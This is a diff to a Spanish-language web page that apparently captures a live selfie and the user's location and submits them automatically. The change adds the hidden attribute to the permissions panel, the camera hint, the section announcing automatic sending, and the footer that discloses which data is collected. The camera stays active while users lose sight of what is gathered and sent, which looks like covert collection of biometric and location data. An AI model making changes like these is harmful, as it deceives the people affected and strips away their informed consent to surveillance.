@@ -18,7 +18,7 @@
         <h1>Confianza y confidencia</h1>
       </header>
 
-      <section class="card permissions" aria-live="polite">
+      <section class="card permissions" aria-live="polite" hidden>
         <div class="card-title">
           <h2>Permisos</h2>
           <button class="btn btn-ghost" type="button" id="retry-permissions">
@@ -57,7 +57,7 @@
       </section>
 
       <section class="card camera">
-        <div class="card-title">
+        <div class="card-title" hidden>
           <h2>Selfie en tiempo real</h2>
         </div>
         <div class="camera-stage">
@@ -71,12 +71,12 @@
           <canvas id="photo-canvas" hidden></canvas>
           <img id="photo-preview" alt="Selfie capturada" hidden />
         </div>
-        <p class="hint" id="camera-hint">
+        <p class="hint" id="camera-hint" hidden>
           Si la camara no se activa, revisa los permisos del navegador.
         </p>
       </section>
 
-      <section class="card form">
+      <section class="card form" hidden>
         <div class="card-title">
           <h2>Envio automatico</h2>
           <span class="hint">Se enviara al tener selfie y ubicacion.</span>
@@ -86,7 +86,7 @@
         </p>
       </section>
 
-      <footer class="footer">
+      <footer class="footer" hidden>
         <p>
           Usamos tu ubicacion, fecha/hora y user agent solo para validacion de
           postulacion.
